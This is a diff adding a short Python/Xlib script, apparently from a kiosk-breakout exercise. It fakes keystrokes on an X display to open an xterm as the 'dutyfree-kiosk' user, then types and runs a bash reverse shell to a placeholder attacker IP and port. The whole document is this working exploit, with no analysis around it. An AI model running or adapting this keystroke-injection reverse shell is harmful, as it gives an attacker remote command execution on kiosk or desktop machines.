@@ -1,0 +1,44 @@
+DISPLAY=:0 python3 - <<'EOF'
+import time
+from Xlib import X, display, XK
+from Xlib.ext import xtest
+
+PAYLOAD = "bash -i >& /dev/tcp/<AttackMachine_IP>/<Port> 0>&1"
+
+d = display.Display(':0')
+
+NAMES = {' ':'space','!':'exclam','"':'quotedbl','#':'numbersign','$':'dollar',
+ '%':'percent','&':'ampersand',"'":'apostrophe','(':'parenleft',')':'parenright',
+ '*':'asterisk','+':'plus',',':'comma','-':'minus','.':'period','/':'slash',
+ ':':'colon',';':'semicolon','<':'less','=':'equal','>':'greater','?':'question',
+ '@':'at','[':'bracketleft','\\':'backslash',']':'bracketright','^':'asciicircum',
+ '_':'underscore','`':'grave','{':'braceleft','|':'bar','}':'braceright','~':'asciitilde'}
+
+def ks(ch): return XK.string_to_keysym(NAMES.get(ch, ch))
+def code_shift(ch):
+    cand = list(d.keysym_to_keycodes(ks(ch)))
+    if not cand: return None, False
+    code, idx = cand[0]
+    return code, (idx % 2 == 1)
+
+SHIFT = d.keysym_to_keycode(XK.string_to_keysym('Shift_L'))
+def press(c):   xtest.fake_input(d, X.KeyPress, c);   d.sync()
+def release(c): xtest.fake_input(d, X.KeyRelease, c); d.sync()
+def tap(c, sh=False):
+    if sh: press(SHIFT)
+    press(c); release(c)
+    if sh: release(SHIFT)
+    time.sleep(0.02)
+
+# Ctrl+Alt+T -> openbox runs xterm as dutyfree-kiosk
+C = d.keysym_to_keycode(XK.string_to_keysym('Control_L'))
+A = d.keysym_to_keycode(XK.string_to_keysym('Alt_L'))
+T = d.keysym_to_keycode(XK.string_to_keysym('t'))
+press(C); press(A); press(T); release(T); release(A); release(C)
+d.sync(); time.sleep(1.5)                       # wait for xterm (focusNew=yes)
+
+for ch in PAYLOAD:
+    c, sh = code_shift(ch)
+    if c: tap(c, sh)
+tap(d.keysym_to_keycode(XK.string_to_keysym('Return')))
+EOF
